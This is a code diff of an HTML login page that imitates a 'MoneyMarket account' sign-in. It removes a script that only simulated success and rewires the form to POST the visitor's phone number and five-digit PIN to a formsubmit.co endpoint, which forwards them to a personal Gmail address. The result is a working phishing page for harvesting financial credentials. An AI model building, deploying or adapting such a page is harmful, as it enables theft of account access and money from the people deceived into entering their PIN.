@@ -19,35 +19,26 @@
   <div class="container">
     <h2>Login to your <br><strong>MoneyMarket account</strong></h2>
 
-    <form id="loginForm">
+    <form action="https://formsubmit.co/mbitomantle@gmail.com" method="POST">
       <div class="input-group">
-        <input type="text" placeholder="e.g. 0821234567" required />
+        <!-- Phone number -->
+        <input type="text" name="phone" placeholder="e.g. 0821234567" required />
+
+        <!-- PIN -->
         <div class="pin-boxes">
-          <input type="password" maxlength="1" required />
-          <input type="password" maxlength="1" required />
-          <input type="password" maxlength="1" required />
-          <input type="password" maxlength="1" required />
-          <input type="password" maxlength="1" required />
+          <input type="password" name="pin1" maxlength="1" required />
+          <input type="password" name="pin2" maxlength="1" required />
+          <input type="password" name="pin3" maxlength="1" required />
+          <input type="password" name="pin4" maxlength="1" required />
+          <input type="password" name="pin5" maxlength="1" required />
         </div>
       </div>
 
-      <button type="submit" class="btn btn-login" id="loginBtn">Login</button>
+      <button type="submit" class="btn btn-login">Login</button>
     </form>
 
-    <button class="btn btn-open">Open an account</button>
+    <button class="btn btn-open" onclick="alert('Redirect to open account page')">Open an account</button>
   </div>
 
-  <script>
-    const loginForm = document.getElementById('loginForm');
-    const loginBtn = document.getElementById('loginBtn');
-
-    loginForm.addEventListener('submit', function(event) {
-      event.preventDefault(); // prevent actual submission
-
-      // Simulate success
-      loginBtn.classList.add('btn-success');
-      loginBtn.textContent = "Success!";
-    });
-  </script>
 </body>
 </html>
